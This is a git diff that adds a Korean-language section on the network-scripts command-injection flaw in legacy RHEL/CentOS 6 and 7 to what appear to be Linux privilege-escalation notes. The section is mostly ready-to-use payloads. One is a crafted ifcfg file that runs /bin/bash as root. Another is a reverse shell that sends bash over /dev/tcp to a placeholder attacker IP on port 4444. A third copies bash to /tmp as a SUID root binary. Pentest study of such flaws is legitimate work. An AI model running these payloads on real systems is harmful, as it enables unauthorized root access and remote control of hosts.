@@ -383,6 +383,48 @@ dpkg -l | grep -i pam
 
 <img width="1103" height="204" alt="image" src="https://github.com/user-attachments/assets/9182c4f8-154e-4020-b544-ecf3300a242b" />
 
+</details>
 
+---
+<details>
+  <summary><strong>network scripts</strong></summary>
+
+## 개요
+
+RHEL/CentOS의 `network-scripts` 패키지에서 네트워크 설정 파일 처리 시 발생하는 명령 삽입 취약점
+
+- **영향 시스템**: RHEL/CentOS 6, 7 (레거시 시스템만)
+- **취약 위치**: `/etc/sysconfig/network-scripts/ifcfg-*`, `route-*`
+- **현재 상태**: RHEL 8에서 deprecated, RHEL 9에서 완전 제거
+
+## 공격 방법
+
+### 전제 조건
+- `/etc/sysconfig/network-scripts/` 디렉토리에 쓰기 권한 필요
+
+### 기본 공격
+
+`/etc/sysconfig/network-scripts/ifcfg-exploit` 파일 생성:
+
+```bash
+NAME=Network /bin/bash
+ONBOOT=yes
+DEVICE=eth0
+```
+
+공백 이후 `/bin/bash`가 root 권한으로 실행됨
+
+### 페이로드 예시
+
+```bash
+# 리버스 쉘
+NAME=x /bin/bash -c 'bash -i >& /dev/tcp/공격자IP/4444 0>&1'
+
+# SUID 바이너리 생성
+NAME=x /bin/cp /bin/bash /tmp/rootbash && /bin/chmod +s /tmp/rootbash
+```
+
+### Ref
+- https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=ifcf#etcsysconfignetwork-scripts-centosredhat
   
 </details>
